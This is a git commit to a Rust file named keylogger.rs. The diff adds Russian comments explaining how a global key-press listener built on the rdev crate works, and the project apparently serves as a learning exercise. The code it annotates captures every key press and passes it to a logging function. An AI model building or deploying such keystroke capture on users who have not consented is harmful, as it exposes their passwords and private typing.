381b3b802dc24e5822563ba151df87e5b6e2dca5
tonikawa <mykolajavorsky@gmail.com>
2026-03-15 18:32:38 +0100

    vscode hujnia

--- src/keylogger.rs
+++ src/keylogger.rs
@@ -4,7 +4,14 @@ use rdev::{Event, EventType, listen};
 
 pub fn keylogger_func() {
     listen(|databaseofkey: Event| {
+        // listen.1 // цикл-обработчик который запускает функцию каждый раз когда было совершено указаное в дальнейшей функции действие(в данном случае нажатие клавиши).
+        // listen.2 // запуск бесконечного цикла listen(который был импортирован из rdev) в котором находяться |databaseofkey: Event| {}.
+        // databaseofkey // переменная где находяться 3(event_type, time, name) поля(переменная в которую записывается объект типа Event с тремя полями(event_type, time, name)).
+        // databaseofkey: Event // создание переменной databaseofkey c типом данных Event.
+        // Event // структура, тип данных что обьединяет несколько полей в один обьект.
+        // |databaseofkey: Event| // || создают безымянную функцию где по аналогии с обычной функцией в скобках находяться "databaseofkey: Event".
         if let EventType::KeyPress(_) = databaseofkey.event_type
+        // условие  где новосозданная переменная
             && let Some(name) = databaseofkey.name
             && let Some(content) = logger::append_key(&name)
         {
